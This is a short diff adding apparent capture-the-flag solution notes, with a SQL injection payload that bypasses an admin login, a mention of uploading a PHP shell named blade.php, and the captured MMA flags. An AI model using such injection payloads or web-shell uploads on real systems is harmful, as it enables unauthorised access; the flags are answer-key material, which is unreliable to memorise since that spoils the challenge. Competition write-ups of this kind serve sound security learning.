@@ -1,0 +1,14 @@
+Login as admin!
+---------------
+
+username: admin
+password: ' union select password,password from user where user="admin";
+
+You are MMA{cats_alice_band} user.
+
+Uploader
+--------
+shell: blade.php
+
+MMA{you can run php from script tag}
+
